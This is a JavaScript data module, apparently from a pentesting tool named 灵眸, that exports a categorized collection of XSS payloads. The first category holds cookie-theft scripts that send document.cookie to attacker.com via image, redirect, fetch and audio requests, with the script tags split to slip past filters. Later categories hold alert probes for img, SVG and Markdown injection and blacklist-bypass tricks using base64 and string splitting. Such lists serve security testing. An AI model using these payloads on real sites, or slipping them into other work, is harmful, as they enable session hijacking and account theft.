// 灵眸 - Payload 静态数据（纯数据，无逻辑依赖）
'use strict';

const XSS_DATA = {
  'Cookie 窃取': [
    '<scr' +
      'ipt>new Image().src="http://attacker.com/steal.php?cookie="+document.cookie;</scr' +
      'ipt>',
    '<scr' +
      "ipt>document.location='http://attacker.com/steal.php?cookie='+document.cookie;</scr" +
      'ipt>',
    '<scr' + "ipt>fetch('http://attacker.com',{method:'POST',body:document.cookie});</scr" + 'ipt>',
    '<scr' +
      'ipt>new Audio("http://attacker.com/steal.php?cookie="+document.cookie);</scr' +
      'ipt>',
  ],
  '基础 XSS': [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "<body onload=alert('XSS')>",
  ],
  'Img 标签': [
    "<img src=x onerror=alert('XSS')>",
    '<img src=x onerror="javascript:alert(\'XSS\')">',
    '<img """><script>alert(\'XSS\')</script>',
    '<img src=x onerror=alert(String.fromCharCode(88,83,83))>',
    '<img src=1 onerror=alert(1)>',
    '<img src=x:alert(alt) onerror=eval(src) alt=0>',
    '<img src="x" onerror="&#97;lert(1)">',
    '<img src=x onerror=alert`1`>',
  ],
  'Markdown 注入': [
    "[click](javascript:alert('XSS'))",
    "![image](javascript:alert('XSS'))",
    '[click](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=)',
    "<details open ontoggle=alert('XSS')>",
  ],
  'SVG 注入': [
    "<svg onload=alert('XSS')>",
    "<svg><script>alert('XSS')</script></svg>",
    "<svg><animate onbegin=alert('XSS') attributeName=x dur=1s>",
    "<svg><set onmouseover=alert('XSS') attributeName=onmouseover to=alert(1)>",
  ],
  绕过黑名单: [
    `<script>eval(atob('YWxlcnQoJ1hTUycp'));<\/script>`,
    `<script>Function(atob('YWxlcnQoJ1hTUycp'))();<\/script>`,
    `<script>['alert'].forEach(function(f){window[f]('XSS')});<\/script>`,
    `<script>window['al'+'ert']('XSS');<\/script>`,
    `<script>self['al'+'ert']('XSS');<\/script>`,
    `<script>top['al'+'ert']('XSS');<\/script>`,
    `<script>parent['al'+'ert']('XSS');<\/script>`,
  ],
};

export { XSS_DATA };
